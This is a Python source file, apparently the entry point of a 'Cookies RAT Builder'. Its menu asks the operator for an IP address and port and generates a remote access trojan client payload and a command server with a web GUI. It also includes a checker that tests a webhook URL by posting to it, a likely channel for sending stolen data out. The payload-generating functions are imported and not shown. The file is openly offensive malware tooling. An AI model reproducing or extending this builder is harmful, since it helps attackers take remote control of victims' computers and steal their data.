import re
import requests
from util.plugins.common import *
from colorama import Fore
from cookies_package import *
from time import sleep

from util.create_files import create_client_payload, create_server_payload


def test_webhook(webhook):
    body = {'content':'WEBHOOK TEST'}
    return requests.post(webhook, json=body).status_code

def validate_webhook(webhook):
    is_valid_url = re.match(pattern=r"^(((http|ftp|https):\/{2})+(([0-9a-z_-]+\.)+(aero|asia|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|cz|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mn|mn|mo|mp|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|nom|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ra|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw|arpa)(:[0-9]+)?((\/([~0-9a-zA-Z\#\+\%@\.\/_-]+))?(\?[0-9a-zA-Z\+\%@\/&\[\];=_-]+)?)?))\b", string=webhook) != None
    is_working = test_webhook(webhook)
    return  is_valid_url and (is_working == 204 or is_working == 200)


'''
MAIN MENU
'''
def main_menu():
    clear()
    settitle(f"Cookies RAT Builder")
    
    print(banner)
    choice = str(input(
            f'{Fore.CYAN}Choice {Fore.YELLOW}>> {Fore.RESET}'))
 

    if choice == '1':       # Create Client PayLoad
        clear()
        ip = str(input(
            f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(
            f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        create_client_payload(ip, port)
        main_menu()

    elif choice == '2':     # Create Server
        clear()
        ip = str(input(
            f'{Fore.CYAN}Enter ip {Fore.YELLOW}>> {Fore.RESET}'))
        port = str(input(
            f'{Fore.CYAN}Enter port {Fore.YELLOW}>> {Fore.RESET}'))

        host_ip = str(input(
            f'{Fore.CYAN}Enter webgui host ip (pc local IP){Fore.YELLOW}>> {Fore.RESET}'))
        host_port = str(input(
            f'{Fore.CYAN}Enter webgui host port (any port not the same as server){Fore.YELLOW}>> {Fore.RESET}'))
        
        create_server_payload(ip, port, host_ip, host_port)
        main_menu()

    elif choice == '420':   # Exit RAT Builder
        settitle("Exiting...")
        clear()
        exit()
        
    else:                   # Invalid Choice
        clear()
        print(f"{Fore.LIGHTRED_EX}Please enter a valid choice{Fore.RESET}")
        sleep(1)
        main_menu()



if __name__ == "__main__": main_menu()
